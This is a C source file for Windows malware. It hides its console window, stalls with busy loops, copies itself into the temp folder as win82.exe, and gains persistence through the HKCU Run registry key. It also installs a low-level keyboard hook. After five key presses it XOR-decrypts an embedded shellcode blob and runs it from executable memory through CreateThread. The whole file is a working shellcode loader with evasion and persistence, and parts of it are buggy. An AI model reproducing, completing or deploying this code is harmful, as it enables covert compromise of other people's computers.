#define _WIN32_WINNT 0x0500
#include<stdlib.h>
#include<stdio.h>
#include<windows.h>
#include<string.h>
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
int count=0;
void xor_decrypt_inject();
void million_increments()
{
    int i,count,inc;
    inc=0;
    count=1000000000;
    for(i=0;i<=count;i++)
    {
        inc++;
    }
}
LRESULT __stdcall HookCallback(int nCode,WPARAM wParam,LPARAM lParam)
{
    if(wParam==WM_KEYDOWN)
    {
        count++;
        if(count==5)
        {
            xor_decrypt_inject();
        }
    }
}
int waitforkeyboard()
{

    if(!(_hook=SetWindowsHookEx(WH_KEYBOARD_LL,HookCallback,NULL,0)))
    {

    }
}
int hide_process()
{
    /*ALSO HIDE THE PROCESS*/
    HWND hwnd=GetConsoleWindow();
    ShowWindow(hwnd,SW_MINIMIZE);
    ShowWindow(hwnd,SW_HIDE);
}
void xor_decrypt_inject()
{
    unsigned char encrypted_shellcode[]="\xcb\xe1\xb1\x84\x52\xaa\xb8\xb0\x4\x52\x9d\x28\x5d\xa0\xc1\x20\x58\x18\x65\x6a\x18\x65\xea\x98\x2\x4a\x77\xb1\x5\x56\x9e\x51\x1c\x31\x9\xad\x2b\x2e\x66\xe3\xa4\x7\x2a\x92\x91\x8a\x59\x98\x4\x19\xed\x69\x5a\x4f\x8d\x47\xb4\x1a\x56\x40\x30\x6\x1c\xe4\x1e\xd0\x17\xba\xc0\xab\xe1\xf1\x1f\xc0\x4f\x40\x77\x97\xf5\xd4\x1c\x9f\xea\x52\x52\x61\xd5\x82\x56\x23\x13\x9f\x9c\x99\x45\x90\x87\xa3\x97\xed\xa8\xd1\x8f\x24\x68\x3f\x3c\xc0\xe3\xd1\xd7\x82\x78\x53\xa4\x65\x12\xa8\x8c\xba\x6f\x6d\x13\xbf\xd0\xbf\xa5\x5c\x48\x75\xec\xce\x40\x81\xb1\xef\x33\x9f\x70\xfb\x16\x12\xc0\x5\x99\x57\xfe\x27\xdd\x95\xd9\xa9\x60\x3d\xa6\x63\x8d\x5d\x5\x29\x78\x50\x72\x6b\xd\xf3\x4c\xcd\xb\xe8\x4e\xb8\x26\x7e\xe3\x31\x93\xb1\x5a\xee\x4\xa6\xb3\x6\x55\xf0\x4b\x18\x4c\xfe\x90\x55\x1a\xcb\x58\x30\x8e\x42\xa2\xfa\xed\x4e\x2b\xe2\x4a\x8f\x84\xb4\xd5\x68\x90\x3b\x39\x88\x21\x73\x6f\xc6\x58\x85\xb0\x6f\xb7\x70\xa6\x36\x98\x51\x4b\x80\xe8\xbb\x82\x31\x43\x1e\xc6\x6c\xcd\x8\x1b\xe\x96\x85\xee\xe7\xdf\x9a\x92\xfd\xb7\x13\x7a\x3d\x6f\x70\x65\x4e\x6d\xe9\x2b\xa0\x48\x85\xdd\x10\xa9\xa6\xc1\xe\x53\xcc\xe8\x83\x79\x43\xd2\x8\x2d\xa5\x4d\x2\x7d\xd0\x54\x6c\x82\xe9\x1\x56\x84\x41\x8d\x9c\x17\xd1\x2c\x36\x48\xa0\x14\xd6\x75\x9\xf4\x9a\x63\x11\x11\x1e\x5b\x51\x7f\xfb\x72\xa7\xa0\x88\xf4\xe8\xd1\x81\xc4\x5e\x77\x9e\x17\x11\x60\x2\x90\xac\xd8\xf5\x4a\xfb\x2\xea\xb0\x66\xee\x8e\xdf\xce\x18\x89\xca\xb3\x1f\x96\xbb\x83\x3f\x59\x84\xea\xe9\x9f\x28\xeb\xda\x25\x93\x40\xa7\xb3\x85\x7b\x70\x0";
    char key[]="vip";
    unsigned char decrypted_shellcode[1000];
    int i;
    int keycount=0;
    for(i=0;i<strlen(encrypted_shellcode);i++)
    {
        decrypted_shellcode[i]=key[keycount]^encrypted_shellcode[i];
        keycount++;
        if(keycount==strlen(key))
        {
            keycount=0;
        }
    }
    LPVOID laddr;
    HANDLE hHand;
    DWORD dWait;
    DWORD threadID;

    laddr=VirtualAlloc(NULL,strlen(decrypted_shellcode),0x3000,0x40);
    RtlMoveMemory(laddr,decrypted_shellcode,strlen(decrypted_shellcode));
    hHand=CreateThread(NULL,0,laddr,NULL,0,&threadID);
    dWait=WaitForSingleObject(hHand,INFINITE);
}
void copy_to_temp()
{
    char filename[MAX_PATH];
    GetModuleFileNameA(NULL,filename,MAX_PATH);
    char path[MAX_PATH];
    int a;
    GetTempPathA(a,path);
    strcat(path,"\win82.exe");
    CopyFile(filename,path, FALSE);
}
void add_to_registry()
{
    char path[MAX_PATH];
    int a;
    GetTempPathA(a,path);
    char str1[MAX_PATH]="\"";
    strcat(str1,path);
    strcat(str1,"\win82.exe\"");
    HKEY hkey;
    RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&hkey);
    RegSetValueEx(hkey,"WINDOWS82", 0,REG_SZ,str1, 50);
    RegCloseKey(hkey);
}
int main()
{
    hide_process();
    million_increments();
    million_increments();
    copy_to_temp();
    add_to_registry();
    waitforkeyboard();
    MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

    return 0;
}
